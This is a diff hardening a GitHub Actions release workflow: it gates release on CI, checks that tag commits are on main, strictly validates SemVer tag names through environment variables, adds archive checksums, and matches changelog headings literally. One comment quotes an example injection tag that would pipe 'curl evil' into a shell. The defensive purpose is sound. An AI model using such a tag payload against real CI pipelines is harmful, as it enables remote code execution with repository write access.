@@ -9,26 +9,68 @@ permissions:
   contents: write
 
 jobs:
+  # The full static suite, called rather than copied. Before this, a tag could publish while CI
+  # was red, or before it had run at all -- pushing main and a tag together let the two race, and
+  # nothing downstream cared which won. `needs: ci` makes the release wait for the same checks a
+  # pull request faces, and fail with them.
+  ci:
+    uses: ./.github/workflows/ci.yml
+
   release:
+    needs: ci
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6
+        with:
+          # Ancestry needs history; the default depth-1 checkout cannot answer whether this tag
+          # is on main.
+          fetch-depth: 0
+
+      # A tag pointing at a commit that never reached main publishes code no review saw. This
+      # is cheap to check and impossible to notice afterwards.
+      - name: Tag is an ancestor of main
+        run: |
+          git fetch --no-tags origin main
+          if ! git merge-base --is-ancestor "$GITHUB_SHA" origin/main; then
+            echo "::error::tag commit ${GITHUB_SHA} is not on origin/main — refusing to publish"
+            exit 1
+          fi
 
       - name: Set up Python
         uses: actions/setup-python@ece7cb06caefa5fff74198d8649806c4678c61a1 # v6
         with:
           python-version: '3.x'
 
-      - name: Extract version from tag
+      # The tag name is attacker-controlled: anyone who can push a tag chooses this string, and
+      # this workflow holds `contents: write`. It is read from the environment rather than
+      # interpolated, and validated as strict SemVer before it can reach a shell, so a tag like
+      # `v1.0.0"; curl evil | sh; "` fails here instead of executing. A `${{ }}` expression is
+      # substituted into the script source before bash ever parses it, which is why every use
+      # below goes through $TAG_VERSION and never through the expression directly.
+      - name: Extract and validate version from tag
         id: version
-        run: echo "version=${GITHUB_REF#refs/tags/v}" >> "$GITHUB_OUTPUT"
+        env:
+          RAW_TAG: ${{ github.ref_name }}
+        run: |
+          version="${RAW_TAG#v}"
+          # The official SemVer 2.0.0 expression, not an approximation of it. The previous one
+          # accepted leading zeros -- v01.0.0 and v1.02.3 both passed and are not valid SemVer --
+          # and treated prerelease and build metadata as one interchangeable blob.
+          semver='^(0|[1-9][0-9]*)\.(0|[1-9][0-9]*)\.(0|[1-9][0-9]*)(-((0|[1-9][0-9]*|[0-9]*[A-Za-z-][0-9A-Za-z-]*)(\.(0|[1-9][0-9]*|[0-9]*[A-Za-z-][0-9A-Za-z-]*))*))?(\+([0-9A-Za-z-]+(\.[0-9A-Za-z-]+)*))?$'
+          if ! printf '%s' "$version" | grep -Eq "$semver"; then
+            echo "::error::tag '${RAW_TAG}' is not a strict SemVer release tag (vMAJOR.MINOR.PATCH)."
+            exit 1
+          fi
+          echo "version=$version" >> "$GITHUB_OUTPUT"
 
       # The tag is the only thing that triggers this workflow, so a tag that disagrees with
       # the committed version would ship an archive stamped differently from the repo it was
       # built from. Fail before building rather than after publishing.
       - name: Tag matches the committed version
+        env:
+          VERSION: ${{ steps.version.outputs.version }}
         run: |
-          TAG_VERSION="${{ steps.version.outputs.version }}"
+          TAG_VERSION="$VERSION"
           FILE_VERSION="$(cat VERSION)"
           if [ "$TAG_VERSION" != "$FILE_VERSION" ]; then
             echo "::error::tag v${TAG_VERSION} does not match VERSION (${FILE_VERSION})."
@@ -37,15 +79,32 @@ jobs:
           fi
 
       - name: Build generic zip
+        env:
+          VERSION: ${{ steps.version.outputs.version }}
+        run: python3 tools/build-zip.py --version "$VERSION"
+
+      # Published beside the archive so a downloader can verify what they got, and so a rebuild
+      # can be compared against the release. That comparison is only meaningful because the
+      # archive is byte-reproducible -- sorted entries, fixed 1980 mtimes, fixed permissions --
+      # so the same commit produces the same digest on any machine.
+      - name: Checksum the archive
         run: |
-          VERSION="${{ steps.version.outputs.version }}"
-          python3 tools/build-zip.py --version "$VERSION"
+          cd dist
+          sha256sum creative-problem-solving.zip > creative-problem-solving.zip.sha256
+          cat creative-problem-solving.zip.sha256
 
       - name: Extract release notes from CHANGELOG.md
         id: changelog
+        env:
+          VERSION: ${{ steps.version.outputs.version }}
         run: |
-          VERSION="${{ steps.version.outputs.version }}"
-          NOTES=$(awk "/^## \[${VERSION}\]/{found=1; next} /^## \[/{if(found) exit} found{print}" CHANGELOG.md)
+          # The version reaches awk as a VARIABLE and is compared literally. Interpolating it
+          # into the regex made every `.` a wildcard -- so 1.2.3 also matched a 1x2x3 heading --
+          # and build metadata containing `+` turned into a quantifier that matched nothing.
+          NOTES=$(awk -v want="## [${VERSION}]" '
+            index($0, want) == 1 { found = 1; next }
+            /^## \[/ { if (found) exit }
+            found { print }' CHANGELOG.md)
           echo "$NOTES" > release-notes.md
           # Blank notes mean CHANGELOG.md has no section for this tag — the release would
           # publish empty and nobody would notice until it was live. Test for a non-space
@@ -63,3 +122,4 @@ jobs:
           fail_on_unmatched_files: true
           files: |
             dist/creative-problem-solving.zip
+            dist/creative-problem-solving.zip.sha256
